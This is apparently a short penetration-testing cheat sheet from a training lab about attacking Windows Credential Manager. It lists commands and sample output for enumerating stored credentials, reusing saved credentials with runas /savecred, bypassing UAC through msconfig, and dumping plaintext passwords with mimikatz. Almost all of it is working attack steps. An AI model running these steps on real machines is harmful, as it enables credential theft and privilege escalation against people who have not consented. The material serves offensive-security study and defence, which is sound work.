# Attacking Credential Manager

## Enumeration

```pwsh
PS C:\Users\sadams> cmdkey /list
```

```output title="Output" hl_lines="3 8"
Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

## Using Previously Saved Credentials

```pwsh
PS C:\Users\sadams> runas /savecred /user:SRV01\mcharles powershell.exe
```

## Bypassing UAC

1. C:\Windows\System32\msconfig.exe
2. Tools
3. Command Prompt
    * Select command: C:\Windows\System32\cmd.exe
    * Launch

## Extracting

```pwsh
PS C:\Users\mcharles> C:\Tools\mimikatz.exe privilege::debug sekurlsa::credman exit
```

```output title="Output" hl_lines="10-12"
Authentication Id : 0 ; 480882 (00000000:00075672)
Session           : Interactive from 0
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 6/7/2025 2:52:18 PM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : Inlanefreight#2025
```
